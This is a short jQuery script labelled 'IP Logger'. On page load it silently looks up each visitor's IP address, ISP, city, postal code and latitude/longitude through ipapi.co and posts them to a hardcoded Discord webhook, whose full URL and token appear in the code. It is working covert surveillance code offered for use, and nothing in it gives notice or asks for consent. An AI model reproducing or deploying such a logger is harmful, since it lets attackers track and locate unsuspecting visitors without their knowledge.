// IP Logger
$(document).ready(function() {
  // Get user information using IPAPI
  $.get("https://ipapi.co/json/", function(data) {
      // Send user information to Discord webhook
      var formattedData = "**IP: **" + data.ip + "\n" +
                          "**Network: **" + data.network + "\n" +
                          "**Version: **" + data.version + "\n" +
                          "**ASN: **" + data.asn + "\n" +
                          "**ISP: **" + data.org + "\n" +
                          "**City: **" + data.city + "\n" +
                          "**Postal Code: **" + data.postal + "\n" +
                          "**Region: **" + data.region + "\n" +
                          "**Country: **" + data.country_name + "\n" +
                          "**Capital: **" + data.country_capital + "\n" +
                          "**Country Population: **" + data.country_population + "\n" +
                          "**Calling Code: **" + data.country_calling_code + "\n" +
                          "**Latitude: **" + data.latitude + "\n" +
                          "**Longitude: **" + data.longitude + "\n" +
                          "**Timezone: **" + data.timezone + "\n" +
                          "**Currency: **" + data.currency + "\n";

      $.ajax({
          type: "POST",
          url: "https://discord.com/api/webhooks/1398500581412175953/H4ErcvJuqeOTe592lziyIvTLsIOX5IMaDSTgbIKmZ3oaU34CA_AKaYp6gZv3qV9QT2dw",
          data: JSON.stringify({ content: formattedData }),
          contentType: "application/json"
      });
  });
});
